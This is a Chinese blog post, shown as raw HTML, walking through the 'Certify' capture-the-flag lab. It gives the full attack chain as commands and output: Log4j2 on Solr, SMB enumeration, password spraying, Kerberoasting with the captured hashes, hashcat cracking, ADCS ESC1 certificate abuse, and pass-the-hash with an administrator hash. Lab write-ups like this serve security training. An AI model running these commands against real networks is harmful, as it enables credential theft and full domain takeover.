<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="flag1fscan扫一下， .&#x2F;fscan -h 39.98.108.206 -p 0-65535 1234567839.98.108.206:22 open39.98.108.206:80 open39.98.108.206:8983 open[*] alive ports len is: 3start vulscan[*] WebTitle http:&#x2F;&#x2F;39.98.108.206">
<meta property="og:type" content="article">
<meta property="og:title" content="春秋云镜Certify">
<meta property="og:url" content="https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/index.html">
<meta property="og:site_name" content="Rufeii">
<meta property="og:description" content="flag1fscan扫一下， .&#x2F;fscan -h 39.98.108.206 -p 0-65535 1234567839.98.108.206:22 open39.98.108.206:80 open39.98.108.206:8983 open[*] alive ports len is: 3start vulscan[*] WebTitle http:&#x2F;&#x2F;39.98.108.206">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260219005635655.png">
<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260219010436734.png">
<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260219011122478.png">
<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260219011943367.png">
<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260219164251158.png">
<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260219165940020.png">
<meta property="article:published_time" content="2026-02-18T14:12:02.000Z">
<meta property="article:modified_time" content="2026-02-19T09:06:17.682Z">
<meta property="article:author" content="Rufeii">
<meta property="article:tag" content="log4j2">
<meta property="article:tag" content="SMB协议">
<meta property="article:tag" content="密码喷洒">
<meta property="article:tag" content="Kerberoasting">
<meta property="article:tag" content="ADCS ESC1">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260219005635655.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/website.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/website.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/website.jpg">
        
      
    
    <!-- title -->
    <title>春秋云镜Certify</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">h0me</a></li><!--
     --><!--
       --><li><a href="/about/">ab0ut</a></li><!--
     --><!--
       --><li><a href="/categories/">categ0ries</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2026/02/03/something-about-buuctf/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&text=春秋云镜Certify"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&is_video=false&description=春秋云镜Certify"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=春秋云镜Certify&body=Check out this article: https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&name=春秋云镜Certify&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&t=春秋云镜Certify"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3-flag4"><span class="toc-number">3.</span> <span class="toc-text">flag3&amp;flag4</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        春秋云镜Certify
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Rufeii</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2026-02-18T14:12:02.000Z" class="dt-published" itemprop="datePublished">2026-02-18</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/ADCS-ESC1/" rel="tag">ADCS ESC1</a>, <a class="p-category" href="/tags/Kerberoasting/" rel="tag">Kerberoasting</a>, <a class="p-category" href="/tags/SMB%E5%8D%8F%E8%AE%AE/" rel="tag">SMB协议</a>, <a class="p-category" href="/tags/log4j2/" rel="tag">log4j2</a>, <a class="p-category" href="/tags/%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/" rel="tag">密码喷洒</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>fscan扫一下， <code>./fscan -h 39.98.108.206 -p 0-65535</code></p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">39.98.108.206:22 open</span><br><span class="line">39.98.108.206:80 open</span><br><span class="line">39.98.108.206:8983 open</span><br><span class="line">[*] alive ports len is: 3</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.98.108.206      code:200 len:612    title:Welcome to nginx!</span><br><span class="line">[*] WebTitle http://39.98.108.206:8983 code:302 len:0      title:None 跳转url: http://39.98.108.206:8983/solr/</span><br><span class="line">[*] WebTitle http://39.98.108.206:8983/solr/ code:200 len:16555  title:Solr Admin</span><br></pre></td></tr></table></figure>

<p>发现了log4j2框架，可以打cve <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/380568.html">log4j2原理分析及漏洞复现- CVE-2021-44228 - FreeBuf网络安全行业门户</a></p>
<p>需要注意一点的就是java版本要改一下，我用的1.8，另外就是用到的几个端口都得去开放一下</p>
<p><img src="/../images/achieve/2026/1/image-20260219005635655.png" alt="image-20260219005635655"></p>
<p>没权限sudo grc提权拿到第一个flag</p>
<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>老2样弄上去，fscan扫下内网</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.26</span><br><span class="line">   [-&gt;]DESKTOP-CBKTVMO</span><br><span class="line">   [-&gt;]172.22.9.26</span><br><span class="line">[*] NetBios 172.22.9.7      [+] DC:XIAORANG<span class="keyword">\XIAORANG</span>-DC    </span><br><span class="line">[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.7</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.9.7</span><br><span class="line">[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] NetBios 172.22.9.47     fileserver                          Windows 6.1</span><br><span class="line">[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        �Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] OsInfo 172.22.9.47  (Windows 6.1)</span><br><span class="line">[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/</span><br><span class="line">[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin</span><br><span class="line">[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">已完成 15/16 [-] ftp 172.22.9.47:21 ftp ftp111 530 Login incorrect. </span><br><span class="line">已完成 15/16 [-] ftp 172.22.9.47:21 ftp 666666 530 Login incorrect. </span><br><span class="line">已完成 15/16 [-] ftp 172.22.9.47:21 ftp Aa12345. 530 Login incorrect.</span><br></pre></td></tr></table></figure>

<ul>
<li>172.22.9.7 XIAORANG\XIAORANG-DC</li>
<li>172.22.9.19 拿下了</li>
<li>172.22.9.26 DESKTOP-CBKTVMO.xiaorang.lab</li>
<li>172.22.9.47 fileserver</li>
</ul>
<p>然后这里47的机子是个文件服务器，可能开了<strong>SMB Client（客户端）：</strong> 像是进店的<strong>顾客</strong>。它是用来连接、查看并操作远程共享资源的<strong>工具或组件</strong>。</p>
<p>于是我们无密码连接一下：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbclient 172.22.9.47 -no-pass</span><br></pre></td></tr></table></figure>

<p>然后使用对应的命令发现了第二个flag和一个数据库文件</p>
<p><img src="/../images/achieve/2026/1/image-20260219010436734.png" alt="image-20260219010436734"></p>
<p>并且提示了spn：简单来说，SPN 是<strong>服务在域内的“身份证号”</strong>。</p>
<h2 id="flag3-flag4"><a href="#flag3-flag4" class="headerlink" title="flag3&amp;flag4"></a>flag3&amp;flag4</h2><p>这里我们看这个数据库，发现有账密，密码喷洒看看能登录哪台机器呗！</p>
<p><img src="/../images/achieve/2026/1/image-20260219011122478.png" alt="image-20260219011122478"></p>
<p>这个db文件可以直接在kali打开也可以放到navicat里面，主要是为了方便导出，导出之后要处理一下文件格式，这个问ai就好了</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 netexec rdp 172.22.9.26 -u usernames.txt -p passwords.txt --continue-on-success &gt; rdp<span class="built_in">_</span>results.txt 2&gt;<span class="built_in">&amp;</span>1</span><br><span class="line"></span><br><span class="line">xiaorang.lab<span class="keyword">\liupeng</span>:fiAzGwEMgTY</span><br><span class="line">xiaorang.lab<span class="keyword">\zhangjian</span>:i9XDE02pLVf</span><br></pre></td></tr></table></figure>

<p>但是这两似乎没权限rdp，但是密码都在这了我们可以去请求ST票据，打Kerberoasting</p>
<blockquote>
<p>简单来说，Kerberoasting 是一种专门针对 Windows 域环境的离线密码攻击技术。<br>它的核心逻辑非常“流氓”：任何一个合法的域用户，都可以向域控请求任意服务的票据，并尝试在自己的电脑上暴力破解这些票据，从而还原出服务账号的明文密码。</p>
</blockquote>
<p>因为ST票据是请求的服务器的服务账号hash加密的，于是我们可以尝试去破解这个hash，这里不就和前面的spn联系起来了吗</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2026/1/image-20260219011943367.png" alt="image-20260219011943367"></p>
<p>得到两串hash</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span>krb5tgs<span class="built_in">$</span>23<span class="built_in">$</span>*zhangxia<span class="built_in">$</span>XIAORANG.LAB<span class="built_in">$</span>xiaorang.lab/zhangxia*<span class="built_in">$</span>2c381ee85ea38fba57f0b13d8bec4792<span class="built_in">$</span>36ec4c8a84f332190a45b83d18aeb8389f138095424ace3d6b01b55355758bfb05297ac278c7141fb93655e743323c7ecf0bde480c0a5be41fbc86f21619af15f6b5a8eca85e8837566b966546e711c15f6cd8455462a1869c0ce1e4e202b623a2f32a644609208e1ea884df08f4e6acfbc204d99a56e5fb4e97a712e22d8697fc40d954926fd748640557deb840e882c4d51a5f32f65ccfbbc7e5965967ff36eb4428cd8fa2170c3c3f562ee2d295d209839e9b5dca904364bd8fbf926dbbf6553a89b9526f9b59f04033f6f5f9ba8d57bdbd323678f76791351181782cf032458ae6149566f0a181c6d5baf5f07a8868ac7318a560536c6570c8b5e2f76ee91f4ed8ef6c1cd1933f7b73b0fe28ce00f54350cad7cfb44691ae87f795f2bc324b599d8bd07ab77c8582cbe3943935f01daa6bbfa70911cc62c272f8376c131e6d884d2de4fe2e5406c528d762e4f7e9fbcc2cdc67485eb503ae68496e2f7fcfe7d4c1c7644b5530960f1551211f5092bf0489fbbdac052d86a6090da290816fba814779ffb55c86a5350264a9d06a974bccff4e1644ff28c20fb8d8cf171b555b1dbb4bccf49fe9f1404ed468818e718fae0192e298251c05e971a378179311fe4b64e6b4bab5634f2dbdb988841b7e73a58e5d4c0c06d3fe7b934c108a8f4f998657129de1207550b758060ba153bea5beb12fcabda755e2d1476cbe6b134cf5b8ed21dae1ad29c212b1a3eb04684c262eefd0105fa7a089416352fa92ae3036a21953b612157c425b325a3aa517e5aaace6082b1eae636a2c9ece677442af4139f52823f0fcb407998b43050c2b960122b17b872cae2c0e35114757d35c30af3485e2ce2ee94068f38aa4f00ec84b1955ae1c406fa5d8eb3353cb3c22f9921017b17dd55308e740ef832f2128c6de1486093cd8dc78ff8d8de360abea179fa5e5ddd17c2795e56f1236c426ed07b4c4e68f3f08999da95cacd7b1d109f7ebf01b2425b458286e22a6a15b2a39be0df801a7ff75527e665772e89404ce39779051c22601c346e31a5f3af465b2d965f04ccc3d276e8bb623bd985fb8d40bca206da38dcba4e5dad760d4a257b9e6da74dc868c61732063e31e8b5a6e33bb546df0991f8829c08fa0b8c9720151be5a0d2feaecfa10d6c2d6f0144698118824885c40f230d3b61c72449fdc745893046a022f0db19146964107af91917819bbce2ba9325ba8dead142e85b89e3883fd7197d3b563021989b134648e9de36eb9bfd34126f23061d2cd4077d400b7e436d0924dc981b72ef43c103d25cacb488ccf95ec1cb2cdac706f245248e985938d603806ef49dfe92262f9694f5f2a6890df3b96da19d4dc77e852563baaf52cc2ef1e4461af70288cae8df3c3fccb15eaf47cdde2a37271dbcaeac9de5fc1eb2337a813d1ee5f8b9a7959f0412d03b16f70420438e623a4dbef7fd6bb4a974e7b7a39f6a4eb1d2f6f84b57508790659e239f8bd69e99f1540dbcdf568a473</span><br><span class="line"><span class="built_in">$</span>krb5tgs<span class="built_in">$</span>23<span class="built_in">$</span>*chenchen<span class="built_in">$</span>XIAORANG.LAB<span class="built_in">$</span>xiaorang.lab/chenchen*<span class="built_in">$</span>4cbb191420cba9216660335c0a767204<span class="built_in">$</span>ed581dff63d30b0b9d77c3a54d0dff0ff4ec76edc43b45dc3d575269fe8efeb9199c98cb8fb1e3f1639dd403e6ccd790b1a5325ebb279c75089b4bea3f381f6661e8b3d3bca1008786e6af5eb230b3eb534dafa8d7ab58a30b0bcfd2a7b6e3f1fc227ec88e09f57e57d16e11167cfbe14295df98eb31353554a4008ac0ca2b176d2feab9a1d3a834ab1fd8cf8a520b893c6bbb5f1b840d231ae3d7a0c46b106115317b9b2f706b7678860726e08f65b020d4ed66f5ab120f42a9a113dcd0495925c0f52a51d10d1acc975bda9cbd252fd4a48d1f9619cdfffa1eee5fdae164c65364b50f37790f3f49f011689f568940cab29bfe231068980c341fcd65e927752a9176d6cca847fd201f13c86cda3a3e14b37fdb4d29d6dacec8302d4800c226fd5bd75f9b8640bd837167bed3266cb09debc1d53f0896c78a0610f651a2cd8cc9c356d7342fb81b540642209a9d64776deb0fdd810cad7799f6c6ab661bfbad4fc0f69e78f0da86504947b94b57c05769f930a7db923ee5c750020dcdeb986add29748fb506eb7600809457a947a7aad74c540a91cc305966d0f393c0596aa3985a5d9b41f5509f456ff71bc7b948ed5b140f4e240cae4c5be2f310747bc0b7c88ea69e5c3b23927f4944e7236814b50d96096e82644257b36e56ade710b19da5b5fa8fdda507ee1e2a3f8d28546ca300860f685fbada366c26c8ac7f8e9a2a0656c67977edd58566e9522fc1cd09e688b5bae3a768119e0a2426893bd045d53222737704a9d963f79d1eab96a8bb6a660599a1566f952ce4fef225dd242589434ee5989f593c1997a98585f98f9a68fa731e59eb1ff9b9d0cec51a9be0d4a529901ef2b3cfb6913eb4c73da0d17d5ff39252efb421fc76f0854607dbba25e9a4514775fb6c818f4c6fe9ac0a4a698da6e801194888ba1c24304b6714d24c01417c02837a8793ff3ea7420fd4da55e9063c6c254a160e1f504e3246bc767ee5ab6a257b8b202d7214b1db972e888936e24b2fba5c8609733080cb250ffb5186523a583d6803ece9970cce16d7714197d367d8d057998043de7533f59b8c106c16772549fd9fb87fd9443b5b25be7923cd480c3f29b74a62251cda90ac80f04f502e4510e53f9639d8bc303e48de54e6c000a658e0af4c2509252d51e760ad757590605291be7e63f0e635de96a181c6e73a7ae352e384092411946106b939d0d84bb1b175da4889507b24d744445b3c463a17b6a4e93f3d0c0df82c198ed19dc3e12de8b5d9970fe40d71ac29ffbf0d41feff600f2c599b199e5e3323f3aeb3bf286c1fd6bb53ca761e1323ab48cfc3d7b8a4c103bdd7a35f60687f88ccd5a53fb45745508449004165990abc5934a0d0ab90ba72a37894a2b07ae5388aa5b127f88f47303b0749906f43bf768350686b4039807e9699d03c117c88cc34f303347ccd9bbe33b48525cbdeaa3276514ebd2afed797dec40cb4eea2c286068a6e48939c8f841de72edc4ecc0671c1</span><br></pre></td></tr></table></figure>

<p>破解即可hash类型为13100</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 1 rockyou.txt --force</span><br></pre></td></tr></table></figure>

<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XIAORANG.LAB<span class="keyword">\zhangxia</span></span><br><span class="line">MyPass2@@6</span><br><span class="line"></span><br><span class="line">XIAORANG.LAB<span class="keyword">\chenchen</span></span><br><span class="line">@Passw0rd@</span><br></pre></td></tr></table></figure>

<p>没想到这两就是服务账号，所以直接利用这个rdp成功了，但是没权限读不了flag，于是先用sharphound信息收集吧，我这里遇到了问题我用的都是旧版的，所以这里借用bao师傅的图</p>
<p><img src="/../images/achieve/2026/1/image-20260219164251158.png" alt="image-20260219164251158"></p>
<p>这里很明显就是打ADCS ESC1这个漏洞</p>
<blockquote>
<p>该漏洞源于不当配置的证书模板，允许任何经过身份验证的用户（有操作 ADCSESC1 漏洞的权限）为其他用户（包括域管理员）申请证书。攻击者可以利用这个漏洞通过创建特定的证书来获取TGT，从而实现权限提升。利用过程包括检测漏洞存在性、创建证书、转换格式以及使用Rubeus等工具请求TGT和执行DCSync操作。</p>
</blockquote>
<p>核心逻辑就是利用配置不当的模板，“合情合理”地通过 AD CS 申请出一张属于“域管理员”的身份证（证书）。然后再去请求TGT票据，通常我们通过 AS-REQ 请求 TGT 时需要用户 Hash。但当引入 ADCS 证书服务后，Windows 支持一种名为 PKINIT，PKINIT 是 Kerberos 协议的一个扩展，它允许用户使用数字证书（公私钥对）而不是对称密钥（密码 Hash）来进行初始身份验证（Pre-Authentication）</p>
<p>攻击步骤：</p>
<ol>
<li><p>查看证书模板：proxychains4 -q certipy-ad find -u ‘<a href="mailto:&#x7a;&#104;&#97;&#x6e;&#103;&#120;&#x69;&#x61;&#64;&#x78;&#105;&#x61;&#111;&#114;&#97;&#110;&#103;&#x2e;&#108;&#x61;&#98;">&#x7a;&#104;&#97;&#x6e;&#103;&#120;&#x69;&#x61;&#64;&#x78;&#105;&#x61;&#111;&#114;&#97;&#110;&#103;&#x2e;&#108;&#x61;&#98;</a>‘  -password ‘MyPass2@@6’ -dc-ip 172.22.9.7 -vulnerable -stdout</p>
</li>
<li><p>请求域管证书：proxychains certipy-ad req -u ‘<a href="mailto:&#x7a;&#104;&#x61;&#110;&#x67;&#x78;&#105;&#x61;&#x40;&#x78;&#105;&#x61;&#111;&#x72;&#x61;&#110;&#x67;&#46;&#x6c;&#x61;&#x62;">&#x7a;&#104;&#x61;&#110;&#x67;&#x78;&#105;&#x61;&#x40;&#x78;&#105;&#x61;&#111;&#x72;&#x61;&#110;&#x67;&#46;&#x6c;&#x61;&#x62;</a>‘ -p ‘MyPass2@@6’ -target 172.22.9.7 -dc-ip 172.22.9.7 -ca ‘xiaorang-XIAORANG-DC-CA’ -template ‘XR Manager’ -upn ‘<a href="mailto:&#97;&#x64;&#x6d;&#105;&#x6e;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#x6f;&#114;&#x40;&#120;&#x69;&#97;&#111;&#x72;&#x61;&#x6e;&#103;&#46;&#x6c;&#x61;&#98;">&#97;&#x64;&#x6d;&#105;&#x6e;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#x6f;&#114;&#x40;&#120;&#x69;&#97;&#111;&#x72;&#x61;&#x6e;&#103;&#46;&#x6c;&#x61;&#98;</a>‘</p>
</li>
<li><p>请求TGT：proxychains certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</p>
</li>
</ol>
<p><img src="/../images/achieve/2026/1/image-20260219165940020.png" alt="image-20260219165940020"></p>
<p>这里就可以返回管理员的hash，于是我们直接PTH即可</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.7 -codec gbk</span><br><span class="line"></span><br><span class="line">proxychains4 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/Administrator@172.22.9.26 -codec gbk</span><br><span class="line"></span><br><span class="line">cd Users<span class="keyword">\Administrator</span><span class="keyword">\flag</span></span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">h0me</a></li>
        
          <li><a href="/about/">ab0ut</a></li>
        
          <li><a href="/categories/">categ0ries</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/links/">links</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3-flag4"><span class="toc-number">3.</span> <span class="toc-text">flag3&amp;flag4</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&text=春秋云镜Certify"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&is_video=false&description=春秋云镜Certify"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=春秋云镜Certify&body=Check out this article: https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
